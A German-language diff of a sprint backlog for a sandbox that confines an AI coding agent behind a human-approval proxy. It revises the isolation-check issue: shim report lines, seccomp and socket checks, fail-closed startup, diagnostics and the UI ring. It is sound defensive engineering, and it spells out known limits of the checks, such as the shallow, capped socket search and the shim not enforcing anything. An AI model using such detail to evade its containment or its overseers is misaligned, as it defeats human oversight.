@@ -13,16 +13,16 @@ Voraussetzungen aus Sprint 0 bis 2: `humanitl-core` (HUM-004, HUM-063), `humanit
 | 4 | HUM-073 | Meta-Endpoint `humanitl.internal` | M | HUM-039, HUM-072 |
 | HUM-066 | Profile | M |
 | 5 | HUM-040 | Sandbox-Screen | M |
-| 6 | HUM-041 | Isolation-Check-Panel und Ring | M |
-| 7 | HUM-042 | Terminal | L |
-| 8 | HUM-043 | `/work`-Härtung | M |
-| 9 | HUM-044 | Setup-Flow | M |
-| 10 | HUM-045 | TLS-Fehler-Erkennung | S |
-| 11 | HUM-075 | `humanitl doctor` | M | HUM-064, HUM-063, HUM-041 |
+| 6 | HUM-041 | Isolation-Check-Panel und Ring | L |
+| 7 | HUM-042 | Terminal | XL |
+| 8 | HUM-043 | `/work`-Härtung | XL |
+| 9 | HUM-075 | `humanitl doctor` | M | HUM-064, HUM-063, HUM-041 |
+| 10 | HUM-044 | Setup-Flow | XL |
+| 11 | HUM-045 | TLS-Fehler-Erkennung | S |
 | HUM-076 | LLM-Server finden | M | HUM-039, HUM-044 |
-| HUM-068 | Geführte Diagnostics im Sandbox-Screen | M |
-| 12 | HUM-067 | `humanitl run` | L |
-| 13 | HUM-046 | Demo-Skript M3 | S |
+| HUM-068 | Geführte Diagnostics im Sandbox-Screen | XL |
+| 12 | HUM-067 | `humanitl run` | XL |
+| 13 | HUM-046 | Demo-Skript M3 | L |
 
 Demo-Ziel am Sprint-Ende (HUM-046): CI startet einen Ollama-Mock, `humanitl run --profile default` startet OpenCode, der erste Prompt geht per Passthrough ans Mock-LLM, der models.dev-Aufruf wird per Default-Regel geblockt, ein `webfetch` wird gehalten, per gRPC erlaubt, und die Antwort erscheint im Terminal-Stream.
 
@@ -31,6 +31,8 @@ Demo-Ziel am Sprint-Ende (HUM-046): CI startet einen Ollama-Mock, `humanitl run 
 > **Review-Korrekturen 2026-09-02** (gelten vor dem Text): HUM-042: ein schreibender Client, beliebig viele lesende (`read_only`), Geometrie des Schreibers, Leser letterboxed; `TERM_001` nur bei zweitem Schreiber. HUM-067: `--ask terminal` verweigert Vollbild-TUI-Agenten (`AgentAdapter::is_fullscreen_tui()` ist für OpenCode `true`) mit Diagnostic `CLI_002` und schlägt `--ask ui` oder `--ask none` vor; `--ask terminal` bleibt für `humanitl sandbox run -- <zeilenorientiertes Kommando>`.
 >
 > **Abgleich 2026-09-02**: Escape-Tests heißen `esc-N-<name>.sh`. Neue Issues HUM-071 (Agent-Briefing, nach HUM-037) und HUM-073 (Meta-Endpoint, nach HUM-039) sind unten angehängt; HUM-046 prüft zusätzlich Block mit Notiz (HUM-072). Bridges und seccomp-Familien kommen aus dem Profil (siehe Sprint 1 Abgleich).
+>
+> **Abgleich 2026-09-04** (Audit von 28 Agenten gegen den Code, 135 Widersprüche in den sieben offenen Issues, 59 blockierend): Die Größen von HUM-041 (L), HUM-042 (XL), HUM-043 (XL), HUM-044 (XL), HUM-046 (L), HUM-067 (XL) und HUM-068 (XL) sind nach Codelektüre berichtigt; jedes der sieben trägt einen Abschnitt „Stand (2026-09-04)" mit den blockierenden Widersprüchen, und die nachweislich falschen Stellen sind im Text selbst korrigiert. HUM-075 rückt vor HUM-044, weil es „Blockiert: HUM-044" erklärt und den `Doctor`-RPC hält, den der Setup-Flow braucht. Die Oberflächen-Hälften von HUM-038 und HUM-045 sind eigene Issues: HUM-105 (Schalter „Deaktivieren") und HUM-106 (TLS-Karte, `diagnosticsProvider`), beide in der Sprint-2-Tabelle von `BACKLOG.md`. Was in mehreren Issues zugleich falsch war: `Notice`, `detach` und `IsolationResult` gibt es in der Proto nicht (committet sind `Open` mit `read_only`, `close`, `CheckResult` als `SandboxEvent.check`); `SandboxRequest.Start` hat nur `profile`, `work_dir`, `work_mode`, `command`; `GetConfig`/`SetConfig` sind bis HUM-069 unimplementiert, und im Repository schreibt nichts `config.toml`; die Bereiche `PROJECT` und `SESSION` existieren im Register nicht, `SANDBOX_010..012` sind Starter-Fehler und `013..016` die Check-Codes; `humanitl run` startet bis HUM-067 nichts.
 
 ## HUM-037 · AgentAdapter-Trait und OpenCode-Profil
 Sprint: 3 · Größe: M · Abhängigkeiten: HUM-004, HUM-011, HUM-014, HUM-022, HUM-062 · Blockiert: HUM-038, HUM-039, HUM-067
@@ -392,7 +394,8 @@ gerufen.
   Feld in `Rule`, eine Zeile in `RuleToDomain`, eine Methode
   `setRuleDisabled` in `DaemonClient`, `GrpcDaemonClient` und
   `FakeDaemonClient`, dann der Schalter in `rule_row.dart` samt seinen
-  ARB-Schlüsseln.
+  ARB-Schlüsseln. Das ist **HUM-105** (`BACKLOG.md`, Sprint-2-Tabelle), angelegt am
+  2026-09-04.
 - **`startup_noise_budget`.** Der Metriktest braucht einen Endpunkt, der
   `/v1/models` beantwortet; den liefert HUM-046. Bis dahin gibt es weder
   `daemon/crates/sandbox/tests/startup_noise.rs` noch das Feature `agent-e2e`
@@ -830,61 +833,66 @@ BACKLOG.md Abschnitt 5 (IA, Modal-Regel, Usability §1 Projektordner); CONVENTIO
 ---
 
 ## HUM-041 · Isolation-Check-Panel und Ring
-Sprint: 3 · Größe: M · Abhängigkeiten: HUM-011, HUM-012, HUM-013, HUM-039, HUM-040 · Blockiert: HUM-044, HUM-046
+Sprint: 3 · Größe: L · Abhängigkeiten: HUM-011, HUM-012, HUM-013, HUM-039, HUM-040 · Blockiert: HUM-044, HUM-046, HUM-067, HUM-068
 
 ### Kontext
 Die drei Garantien (BACKLOG.md 4.1) sind nur dann ein Argument, wenn der Nutzer sie live sehen kann. Usability: der Check ist der Reassurance-Moment bei jedem Start, drei Zeilen animieren auf grün, eine vierte amber Zeile zeigt die LLM-Ausnahme. Der Ring im Header (Signature-Element 2) ist das Produktversprechen, immer sichtbar. Fehlschlag deaktiviert den Start, nie „trotzdem starten".
 
 ### Ziel
-Der Daemon führt beim Session-Start drei Prüfungen aus, deren Beweise aus der laufenden Sandbox stammen (nicht aus dem Host), streamt sie als `IsolationResult`, und das UI zeigt Panel und Ring. Der Ring hat drei Segmente, jedes Segment entspricht einer Prüfung. Der Agent wird erst `exec`t, wenn alle drei bestanden sind.
+Der Daemon liest beim Session-Start die Prüfzeilen des Shims aus der laufenden Sandbox (nicht aus dem Host), faltet sie zu den drei Garantien und streamt sie als `SandboxEvent.check` (`CheckResult`, `proto/humanitl/v1/humanitl.proto`); das UI zeigt Panel und Ring. Der Ring hat drei Segmente, jedes Segment entspricht einer Prüfung. Fällt eine Prüfung aus oder fehlt der Bericht, beendet der Daemon die Sandbox, bevor Verkehr weitergeleitet wird, und meldet `Status(failed)` mit dem Befund — fail-closed, wie `enforce_isolation` in `daemon/bin/humanitl/src/cmd/sandbox.rs` es für die Kommandozeile schon tut.
 
 ### Nicht-Ziel
-Keine Prüfungen der Regel-Engine oder des Proxys (ESC-3/4 sind CI-Tests, nicht Laufzeit). Kein periodisches Re-Checking im MVP (Post-MVP: alle 60 s).
+Keine Prüfungen der Regel-Engine oder des Proxys (ESC-3/4 sind CI-Tests, nicht Laufzeit). Kein periodisches Re-Checking im MVP (Post-MVP: alle 60 s). Keine Änderung am Shim-Vertrag aus CONVENTIONS 4.12: kein neues Argument, kein neues Zeilenformat, keine Erzwingung im Shim.
 
 ### Betroffene Pfade
-- `daemon/bin/humanitl-shim/src/main.rs`: Check-Phase vor `exec`
-- `daemon/crates/sandbox/src/isolation.rs` (neu): Auswertung der Shim-Meldungen
-- `daemon/crates/sandbox/src/bwrap.rs`: Report-Pipe
-- `app/lib/features/sandbox/widgets/isolation_panel.dart` (neu)
-- `app/lib/features/sandbox/widgets/isolation_ring.dart` (neu)
-- `app/lib/app.dart`: Ring im Header
-- `app/lib/features/sandbox/providers/isolation_check_provider.dart` (neu)
-- `tests/escape/esc-1-sockets.sh`, `esc-2-mounts.sh` (bestehend aus HUM-006): nutzen dieselben Beweise
-- ARB: `isolation_*`
+- `daemon/crates/ipc/src/sandbox.rs`: `Op::IsolationCheck` ruft `BwrapBackend::isolation_check` auf dem gehaltenen Handle statt den Schnappschuss zu liefern; `Inner::start` sendet die drei `SandboxEvent.check` zwischen `Status(starting)` und `Status(running)` und bricht bei einem roten Ergebnis fail-closed ab
+- `daemon/crates/ipc/src/convert.rs`: `CheckResult` nach Proto, Säuberung der `evidence`
+- `daemon/crates/ipc/tests/fake_parity.rs`: der Fake (`daemon/crates/ipc/src/fake/mod.rs`, `isolation_checks()`) sendet die drei Ereignisse schon; echter Dienst und Fake müssen dieselbe Form liefern
+- `app/lib/core/domain/sandbox.dart`: `IsolationCheckResult`, `SandboxUpdate.check`, `SandboxStatus.checks`
+- `app/lib/core/ipc/convert.dart`, `daemon_client.dart`, `grpc_daemon_client.dart` (der Zweig `SandboxEvent_Event.check_2` verwirft das Ereignis heute), `fake_daemon_client.dart`
+- `app/lib/features/sandbox/widgets/isolation_panel.dart` (neu): ersetzt das `ComingPane` des Reiters `SandboxTab.isolation` in `sandbox_screen.dart`
+- `app/lib/features/shell/widgets/header_bar.dart`: `IsolationRingPlaceholder` und `_RingPainter` werden an Ort und Stelle zustandsgesteuert; das Semantik-Label `shellIsolationUnknown` bleibt für den grauen Zustand
+- `app/l10n/app_en.arb`, `app_de.arb`: `isolationCheck1..3`, `isolationException`, `isolationExceptionNone`, `isolationShowArgv` (camelCase, CONVENTIONS 4.11); `sandboxIsolationPlaceholder` entfällt
+- `tests/escape/esc-1-sockets.sh`, `esc-2-mounts.sh`: unverändert; sie messen dieselben Tatsachen unabhängig von innen und bleiben das
+
+Gestrichen gegenüber der ersten Fassung: `daemon/crates/sandbox/src/isolation.rs` (die Auswertung steht seit HUM-011 in `bwrap.rs::isolation_check`), „`bwrap.rs`: Report-Pipe" (steht: `LaunchOnce.report`, `read_report`), `daemon/bin/humanitl-shim/src/main.rs` (die Prüfungen sind da, dieses Issue ändert am Shim nichts), `app/lib/app.dart` (48 Zeilen, hält keinen Header), `providers/isolation_check_provider.dart` (die Ergebnisse kommen über `sandboxStatusProvider`).
 
 ### Spezifikation
 
-Ablauf im Shim (`humanitl-shim`, kein tokio, nur `libc`/`nix`):
+**Was schon steht (HUM-011, HUM-012, HUM-013; CONVENTIONS 4.12), und woran sich dieses Issue hält:**
 
-1. Shim wird von bwrap als PID 1 des Sandbox-PID-Namespace gestartet mit Argumenten `--report-fd 3 --proxy-sock /run/humanitl/proxy.sock --proxy-port 3128 --extra-bridge 3129:/run/humanitl/models.sock -- <agent argv>`.
-2. Startet socat-Bridge(n) als Kindprozesse. Wartet per `connect()` auf `127.0.0.1:3128`, bis Listen bereit ist (max 2 s, 20 ms Schritte).
-3. **Check 1 `NoNetworkInterface`:** Liest `/sys/class/net/` (Verzeichnisliste) und `/proc/net/dev`. Bestanden, wenn beide genau `lo` enthalten. Evidence-String: `"interfaces: lo"`. Fallback, wenn `/sys` nicht gemountet ist: nur `/proc/net/dev`.
-4. **Check 2 `SingleSocket`:** Liest `/proc/net/unix`, zählt Zeilen mit Pfad (Spalte 8, nicht leer, nicht mit `@` beginnend). Erlaubt: genau die Pfade aus `--proxy-sock` und `--extra-bridge`. Zusätzlich `walk /` mit `nftw`, zählt `S_IFSOCK`-Einträge (max. Tiefe 8, `/proc` und `/sys` ausgelassen). Bestanden, wenn beide Mengen ⊆ erlaubte Pfade. Evidence: `"sockets: /run/humanitl/proxy.sock"`. Prüft außerdem, dass `/run/humanitl/daemon.sock` und `$XDG_RUNTIME_DIR` nicht existieren.
-5. Schreibt Ergebnis von Check 1 und 2 als eine Zeile JSON pro Check auf `--report-fd`: `{"check":"NoNetworkInterface","passed":true,"evidence":"interfaces: lo"}`.
-6. Setzt seccomp-Filter (HUM-012). Danach:
-7. **Check 3 `SeccompActive`:** Liest `/proc/self/status`, Zeile `Seccomp:`, erwartet `2`. Ruft `socket(AF_INET, SOCK_STREAM, 0)` auf und erwartet Erfolg (Loopback zum Proxy ist erlaubt); `socket(AF_UNIX, SOCK_STREAM, 0)` und `socket(AF_INET, SOCK_DGRAM, 0)` erwarten `-1` mit `errno == EPERM`; `socketpair(AF_UNIX)` bleibt erlaubt (kein Egress, CONVENTIONS 4.11). Gelesen wird `/proc/self/status` eines gefilterten Kindes, nie `/proc/1/status` (PID 1 ist bwraps Init). Evidence: `"seccomp: 2, socket(AF_INET,SOCK_STREAM)=ok, socket(AF_UNIX)=EPERM, socket(AF_INET,SOCK_DGRAM)=EPERM, socketpair=ok"`. Fehlschlag ⇒ `SANDBOX_016`; kein Bericht ⇒ `SANDBOX_013`; Check 1 ⇒ `SANDBOX_014`; Check 2 ⇒ `SANDBOX_015`. Schreibt Zeile auf Report-FD.
-8. Schließt Report-FD (EOF ist das Signal „Checks fertig"). Wenn ein Check fehlgeschlagen ist: `exit(3)` ohne `exec`. Sonst `execvp(agent argv)`.
+1. Der Shim wird als `humanitl-shim --proxy-port <port> -- <cmd>` gestartet; Brücken, Filtertabelle und der Berichts-Deskriptor kommen aus der Umgebung (`HUMANITL_BRIDGES`, `HUMANITL_SECCOMP_*`, `HUMANITL_REPORT_FD`), nie aus der Kommandozeile, damit keine Sicherheitsentscheidung in `/proc/<pid>/cmdline` steht. Jede andere Option endet mit Exit 125 (`daemon/bin/humanitl-shim/src/main.rs`, `parse_cli`). Der Shim ist nicht PID 1 der Sandbox; das ist bwraps Init (kein `--as-pid-1`, CONVENTIONS 4.11).
+2. Der Shim bindet die Brücke selbst (`bridge.rs`, `std::net::TcpListener`) und verbindet sich einmal zu sich selbst (`self_connect`). Kein socat, keine `connect()`-Warteschleife.
+3. Er schreibt **fünf** Zeilen im Format `CHECK <name> <ok|fail> <evidence>` (je eine `write(2)`, `report.rs`): `bridge_listening`, `no_interfaces`, `single_socket` vor dem seccomp-Filter, `seccomp_applied` und `families` aus dem gefilterten Kind danach. Kein JSON. `no_interfaces` liest `/sys/class/net` und fällt nur im Fehlerfall auf `/proc/net/dev` zurück. `single_socket` ist ein sortierter Breitensuchlauf in Rust std über das Dateisystem der Sandbox (`SOCKET_WALK_MAX_DEPTH` = 3, höchstens 2000 Einträge, ohne `/proc`, `/sys` und `/dev` außer `/dev/shm`) und meldet `sockets=…;unexpected=…;entries=N;limit=none|entries|depth`. Kein `/proc/net/unix`, kein `nftw`, keine Prüfung auf `daemon.sock` oder `$XDG_RUNTIME_DIR` (das ist ESC-2). `families` probt `socket(AF_UNIX,SOCK_STREAM)`, `socket(AF_INET,SOCK_DGRAM)`, den x32-Socket-Syscall und `io_uring_setup` (alle `EPERM`) sowie `socket(AF_INET,SOCK_STREAM)` (ok). Eine `socketpair`-Probe gibt es nicht; Beleg für „`socketpair` bleibt erlaubt" sind allein `filter_allows_socketpair` in `seccomp.rs` und ESC-1.
+4. Der Shim erzwingt nichts: Prüfung 1 und 2 werden gemeldet, der Agent wird trotzdem gestartet. Exit-Codes des Shims sind 125, 126, 127; ein „Exit 3 ohne exec" gibt es nicht. Fail-closed ist Sache des Hosts.
+5. `BwrapBackend::isolation_check(&SandboxHandle)` (`daemon/crates/sandbox/src/bwrap.rs`) faltet die fünf Zeilen zu drei `CheckResult { check, passed, evidence, diagnostic }` (CONVENTIONS 3.4): `no_interfaces` ⇒ `NoNetworkInterface`, `single_socket` + `bridge_listening` ⇒ `SingleSocket`, `seccomp_applied` + `families` ⇒ `SeccompActive`; beide Quellzeilen stehen in der `evidence`. Eine fehlende Zeile gilt als `passed: false`. Gemessen mit `humanitl sandbox check --json` am 2026-09-04:
 
-Daemon-Seite (`isolation.rs`): liest die Report-Pipe bis EOF, parst die drei Zeilen, streamt je ein `SandboxEvent::IsolationResult`. Fehlt eine Zeile (Shim abgestürzt) ⇒ alle fehlenden Checks `passed: false`, Evidence `"no report from shim"`, Diagnostic `SANDBOX_010`. Danach:
+```
+no_interfaces ok: lo
+single_socket ok: sockets=/run/humanitl/proxy.sock;unexpected=none;entries=2000;limit=entries; bridge_listening ok: proxy=127.0.0.1:3128->/run/humanitl/proxy.sock
+seccomp_applied ok: Seccomp:2;NoNewPrivs:1; families ok: socket(AF_UNIX,SOCK_STREAM)=EPERM;socket(AF_INET,SOCK_DGRAM)=EPERM;x32:socket=EPERM;io_uring_setup=EPERM;socket(AF_INET,SOCK_STREAM)=ok
+```
 
-| Ergebnis | Aktion |
+| Ergebnis | Diagnostic (registriert in `codes.rs`, erzeugt in `bwrap.rs`) |
 |---|---|
-| alle bestanden | `Status(running)`, Agent läuft |
-| Check 1 fehlgeschlagen | `SANDBOX_011` (Blocking): "The sandbox has a network interface other than loopback ({evidence}). This should be impossible with --unshare-net. Refusing to start." `fix: CopyCommand("bwrap --version")`, docs Link |
-| Check 2 fehlgeschlagen | `SANDBOX_012` (Blocking): "Unexpected socket(s) inside the sandbox: {evidence}. A mount in your profile exposes a host socket." `fix: ChangeSetting { key: "sandbox.mounts" }` |
-| Check 3 fehlgeschlagen | `SANDBOX_013` (Blocking): "The seccomp filter is not active ({evidence}). Kernel or bubblewrap too old, or seccomp disabled." `fix: CopyCommand("uname -r && bwrap --version")` |
+| kein Bericht (Zeile fehlt, Shim abgestürzt) | `SANDBOX_013` (Blocking), alle fehlenden Prüfungen `passed: false` |
+| Check 1 fehlgeschlagen | `SANDBOX_014` (Blocking) |
+| Check 2 fehlgeschlagen | `SANDBOX_015` (Blocking) |
+| Check 3 fehlgeschlagen | `SANDBOX_016` (Blocking) |
 
-`CheckResult` (CONVENTIONS.md 3.4) trägt `evidence` und optional `diagnostic`.
+`SANDBOX_010..012` sind Starter-Fehler (Argumentliste, Platzhalter, Kommandozeile) und bleiben es (CONVENTIONS 4.11). Titel und `fix` der vier Codes stehen in `bwrap.rs` und `codes.rs`; dieses Issue erfindet keine neuen.
 
-Vierte Zeile (Ausnahme): kein Check, sondern aus `configProvider`: `llm.endpoint` plus Passthrough-Regel. Wenn kein Endpoint gesetzt ist, zeigt die Zeile „Keine LLM-Ausnahme konfiguriert" in grau.
+**Neu in diesem Issue, Daemon:** `SandboxService` (`daemon/crates/ipc/src/sandbox.rs`) ruft nach `launch` `isolation_check` auf dem gehaltenen Handle, sendet je Ergebnis ein `SandboxEvent.check`, dann `Status(running)`. Ist ein Ergebnis `passed: false` oder fehlt der Bericht: `handle.kill()`, das `Diagnostic` des Ergebnisses als `SandboxEvent.diagnostic`, `Status(failed)`. `Op::IsolationCheck` antwortet mit denselben drei Ereignissen der laufenden Sandbox statt mit dem Schnappschuss; ohne laufende Sandbox sagt die Antwort das, statt drei graue Ergebnisse zu senden. In `convert.rs` läuft `evidence` durch eine Säuberung nach dem Muster von `humanitl_core::sanitize_note` (`block.rs`: Steuerzeichen, Zero-Width, Bidi-Marken entfernen, Länge deckeln), denn der Suchlauf läuft bis Tiefe 3 auch über `/work`, und ein Socket-Dateiname dort stammt vom Agenten; die Säuberung des Shims (`report::sanitize`) ersetzt nur Whitespace und `Cc`, und `parse_check_line` (`bridge_env.rs`) prüft nichts nach.
 
-Panel-Layout (`IsolationTab`):
+**Vierte Zeile (Ausnahme):** kein Check, sondern `SandboxStatus.llmEndpoint` aus `sandboxStatusProvider` (`Status.llm_endpoint` der Proto, gefüllt in `ipc/src/sandbox.rs`). Wenn kein Endpoint gesetzt ist, zeigt die Zeile „Keine LLM-Ausnahme konfiguriert" in grau. Einen `configProvider` gibt es nicht; `GetConfig` bleibt bis HUM-069 unimplementiert.
+
+Panel-Layout (`IsolationTab`, Evidenz in Mono 11, rechts):
 
 ```
 ┌ Isolation ────────────────────────────────────────────────┐
-│ ● No network interface. There is nowhere for traffic to go. │  evidence: interfaces: lo
-│ ● Exactly one door: a socket that leads to Humanitl.        │  evidence: sockets: /run/humanitl/proxy.sock
-│ ● The kernel refuses to open any new door (seccomp).        │  evidence: seccomp: 2, socket()=EPERM
+│ ● No network interface. There is nowhere for traffic to go. │  no_interfaces ok: lo
+│ ● Exactly one door: a socket that leads to Humanitl.        │  single_socket ok: sockets=/run/humanitl/proxy.sock;… ; bridge_listening ok: …
+│ ● The kernel opens no new door (seccomp).                   │  seccomp_applied ok: Seccomp:2;NoNewPrivs:1; families ok: …
 │ ◐ Exception: LLM at 192.168.1.50:11434 — passthrough,       │  [change]
 │   logged, never held.                                       │
 │                                                             │
@@ -892,90 +900,137 @@ Panel-Layout (`IsolationTab`):
 └─────────────────────────────────────────────────────────────┘
 ```
 
-Strings (ARB `isolation_check_1..3`, `isolation_exception`, `isolation_exception_none`, `isolation_show_argv`):
+Trägt die Zeile `single_socket` ein `limit=entries` oder `limit=depth` — auf dem Entwicklungsrechner ist das heute der Fall —, sagt das Panel, dass der Suchlauf früh abgebrochen hat, statt ein glattes Grün zu zeigen (CONVENTIONS 4.13, „Nie mehr behaupten als bewiesen ist"). Der erschöpfende Beweis bleibt ESC-2.
+
+Strings (ARB `isolationCheck1..3`, `isolationException`, `isolationExceptionNone`, `isolationShowArgv`); der Wortlaut ist der aus `docs/SECURITY.md` Abschnitt 1 und BACKLOG.md 4.1, wortgleich:
 - en 1: "No network interface. There is nowhere for traffic to go." / de: "Kein Netzwerk-Interface. Es gibt keinen Weg nach draußen."
 - en 2: "Exactly one door: a socket that leads to Humanitl." / de: "Genau eine Tür: ein Socket, der zu Humanitl führt."
-- en 3: "The kernel refuses to open any new door (seccomp)." / de: "Der Kernel verweigert jede neue Tür (seccomp)."
+- en 3: "The kernel opens no new door (seccomp)." / de: "Der Kernel öffnet keine neue Tür (seccomp)."
 - en Ausnahme: "Exception: LLM at {endpoint} — passthrough, logged, never held." / de: "Ausnahme: LLM unter {endpoint}, Passthrough, geloggt, nie angehalten."
 
-Animation: Zeilen erscheinen nacheinander mit 120 ms Versatz, Punkt wechselt von `fg-2` auf `allowed`-Grün mit 200 ms Fade, wenn das Ergebnis eintrifft. Fehlschlag: Punkt `blocked`-Rot, Zeile bekommt darunter die Diagnostic-Karte mit Fix-Button. Evidence in `fg-2`, Mono 11, rechts.
+Animation: Zeilen erscheinen nacheinander mit 120 ms Versatz, Punkt wechselt von `fg-2` auf `allowed`-Grün mit 200 ms Fade, wenn das Ergebnis eintrifft. Fehlschlag: Punkt `blocked`-Rot, Zeile bekommt darunter die `HDiagnosticCard` (`app/lib/core/ui/h_diagnostic_card.dart`) mit `FixControl`. Evidence in `fg-2`, Mono 11, rechts, ohne Bidi-Umordnung.
 
-Ring (`IsolationRing`, 20 px, im Header rechts neben dem Sandbox-Glyph): `CustomPainter`, drei Bogen-Segmente à 110° mit 10° Lücke, Strichstärke 2 px. Segment-Farbe: `fg-2` (unbekannt/gestoppt), `allowed` (bestanden), `blocked` (fehlgeschlagen), `held`-Amber pulsierend (läuft). Klick ⇒ `NavIntent(4)` und Tab `Isolation`. Tooltip: „3/3 Isolation checks passed" oder „Isolation check failed: {title}".
+Ring (`IsolationRing`, 20 px, im Header rechts neben dem Sandbox-Glyph): `_RingPainter` in `header_bar.dart` behält seine Geometrie (drei Bögen, 2 px, Lücken 0,35 rad). Segment-Farbe: `fg-2` (unbekannt/gestoppt), `allowed` (bestanden), `blocked` (fehlgeschlagen), `held`-Amber pulsierend (läuft). Klick ⇒ `NavIntent(Section.sandbox.index)` (Index 3, `Ctrl+4`; `app/lib/features/shell/section.dart`), nie die Ziffer hart, und Wunsch nach dem Reiter Isolation. Tooltip: „3/3 Isolation checks passed" oder „Isolation check failed: {title}".
 
 ### Schritte
-1. Shim: Report-FD-Argument, Check 1 und 2 vor seccomp, Check 3 danach, Exit-Code 3 bei Fehlschlag. Unit-Tests für die Parser (`/proc/net/dev`, `/proc/net/unix`) mit eingebetteten Beispieldateien.
-2. bwrap-Launcher: Pipe anlegen, FD 3 vererben (`--` Argumente, kein `CLOEXEC`), Leser-Task im Daemon.
-3. `isolation.rs`: Parser, Diagnostics `SANDBOX_010..013`, Event-Emission, Start-Abbruch.
-4. Flutter: Provider, Panel, Ring, Header-Einbindung, Strings.
-5. Escape-Tests `esc-1-sockets.sh`, `esc-2-mounts.sh` verwenden `humanitl sandbox check --json`, das dieselben Ergebnisse ausgibt.
+1. Daemon: `Inner::start` und `Op::IsolationCheck` in `daemon/crates/ipc/src/sandbox.rs`, Konvertierung und Säuberung in `convert.rs`. Tests: fehlender Bericht ⇒ drei `passed: false`, `SANDBOX_013`, `Status(failed)`; roter Check ⇒ `Diagnostic` (Blocking) und `failed`; `fake_parity.rs` gegen `fake/mod.rs`. Säuberungstest mit einem Socket-Pfad, der U+202E trägt, und einem mit 4 KiB Füllung.
+2. Dart-Domäne (`IsolationCheckResult`, `SandboxUpdate.check`, `SandboxStatus.checks`), Konvertierung, der Zweig in `grpc_daemon_client.dart`, der Fake. Geteilte Dateien: unmittelbar vor jedem Schreiben neu lesen, nur anhängen (CLAUDE.md).
+3. ARB-Schlüssel in beiden Dateien mit `@`-Beschreibung.
+4. Panel, Ring, Header-Einbindung.
+5. Widget-Tests und Goldens.
+
+Gestrichen: „Escape-Tests verwenden `humanitl sandbox check --json`". ESC-1 und ESC-2 messen von innen (`esc-2-mounts.sh`: `exactly_one_socket`, `socket_is_proxy`); sie durch den Selbstbericht des Daemons zu ersetzen, nähme der Suite ihre Unabhängigkeit.
 
 ### Tests
-- Shim-Unit: `parse_proc_net_dev_only_lo`, `parse_proc_net_unix_filters_abstract`, `socket_walk_ignores_proc_sys`.
-- Sandbox-Integration (bwrap, Feature `escape`): Normalstart ⇒ drei `passed: true`; Profil mit absichtlichem Mount von `/tmp/.X11-unix` ⇒ Check 2 `passed: false`, `SANDBOX_012`, Agent wurde nicht gestartet (Marker-Datei fehlt).
-- Daemon-Unit: fehlende Report-Zeilen ⇒ `SANDBOX_010`.
-- Widget: Panel zeigt drei Zeilen grün nach drei Events; Fehlschlag zeigt Diagnostic-Karte; Ring-Painter-Golden für 0/3, 3/3, 1 rot.
+- Daemon: `start_with_failing_report_yields_checks_and_failed`, `missing_report_yields_sandbox_013`, Parität in `fake_parity.rs`.
+- Sandbox-Integration (bwrap, wie `daemon/crates/sandbox/tests/launcher.rs`, grün übersprungen ohne bwrap): Normalstart ⇒ drei `passed: true`. Roter Fall: eine Unix-Socket-Datei, die vor dem Start im Projektverzeichnis liegt ⇒ `single_socket fail` ⇒ `SANDBOX_015`, Sandbox beendet. Die erste Fassung wollte dafür `/tmp/.X11-unix` einhängen; das lehnt schon das Profil mit `SANDBOX_006` ab (`FORBIDDEN_MOUNTS`, `profile.rs`), Check 2 ist auf diesem Weg unerreichbar.
+- Widget: Panel zeigt drei Zeilen grün nach drei Events; Fehlschlag zeigt Diagnostic-Karte; graue vierte Zeile ohne Endpoint; `limit=entries` wird als Abbruch gezeigt; Ring-Painter-Golden für 0/3, 3/3, 1 rot.
+
+Die Shim-Parser-Tests der ersten Fassung (`parse_proc_net_dev_only_lo`, `parse_proc_net_unix_filters_abstract`) entfallen: `/proc/net/unix` wird nicht gelesen, und `report.rs` hat seine drei Tests seit HUM-012.
 
 ### Akzeptanzkriterien
-- [ ] `humanitl sandbox check --json` liefert drei Objekte mit `passed: true` auf dem Entwicklungsrechner.
-- [ ] Mount von `/tmp/.X11-unix` im Profil führt zu `SANDBOX_012` in CLI (Exit 3) und UI (Start deaktiviert, Diagnostic sichtbar).
+- [x] `humanitl sandbox check --json` liefert drei Objekte mit `passed: true` auf dem Entwicklungsrechner. Erfüllt seit HUM-011/012/013, gemessen 2026-09-04; kein Beitrag dieses Issues.
+- [ ] Dieselben drei Ergebnisse kommen über `Sandbox(Start)` und `Sandbox(IsolationCheck)` als `SandboxEvent.check` und stehen mit ihrer `evidence` im Panel.
+- [ ] Eine Socket-Datei im Projektverzeichnis vor dem Start führt zu `SANDBOX_015` in CLI (Exit 3) und UI (`Status(failed)`, Diagnostic sichtbar, kein „trotzdem starten").
 - [ ] Ring im Header ist bei laufender Sandbox komplett grün, bei gestoppter grau.
-- [ ] Vierte Zeile zeigt den konfigurierten Endpoint amber.
-- [ ] ESC-1 und ESC-2 grün in CI.
+- [ ] Vierte Zeile zeigt den konfigurierten Endpoint amber, ohne Endpoint den grauen Satz.
+- [ ] `limit=entries` oder `limit=depth` in der Evidenz erscheint als abgebrochener Suchlauf, nicht als glattes Grün.
+- [ ] ESC-1 und ESC-2 grün in CI (heute schon; unverändert).
+
+### Stand (2026-09-04): Größe L, der Daemon misst schon, es fehlt die Leitung und die Oberfläche
+
+Audit von 28 Agenten gegen den Code: 20 Widersprüche, 7 blockierend, oben im Text korrigiert. Die Prüfung sitzt im Shim und ist seit HUM-012/013 fertig; `BwrapBackend::isolation_check` faltet sie seit HUM-011; `humanitl sandbox check --json` liefert die drei grünen Objekte heute. Was fehlt, ist klein im Daemon (`Op::IsolationCheck` und `Inner::start` in `daemon/crates/ipc/src/sandbox.rs` liefern nur `Status` und `Diagnostic`, der Kommentar dort sagt es) und groß in Flutter (Domäne, Konvertierung, Panel, Ring, sechs ARB-Schlüssel, Goldens). Daher L statt M.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
+- Sie beschrieb einen Shim-Aufruf `--report-fd 3 --proxy-sock … --extra-bridge …`, den der Shim mit Exit 125 ablehnt (`parse_cli` kennt `--proxy-port`, `--rules`, `--help`), und JSON-Zeilen, die niemand schreibt; das Format ist `CHECK <name> <ok|fail> <evidence>` mit fünf Namen, nicht drei.
+- Sie nannte `SANDBOX_010..013` als Check-Codes; das sind Starter-Fehler. Die Check-Codes sind `SANDBOX_013..016` (CONVENTIONS 4.11, `codes.rs`), und ihr eigener Schritt 7 sagte das schon.
+- Sie behauptete „der Agent wird erst exec't, wenn alle drei bestanden sind" und „Exit 3 ohne exec". Der Shim meldet nur; erzwungen wird auf dem Host (`enforce_isolation`). Wer das im Shim will, ändert HUM-012 und CONVENTIONS 4.12, nicht ein UI-Issue.
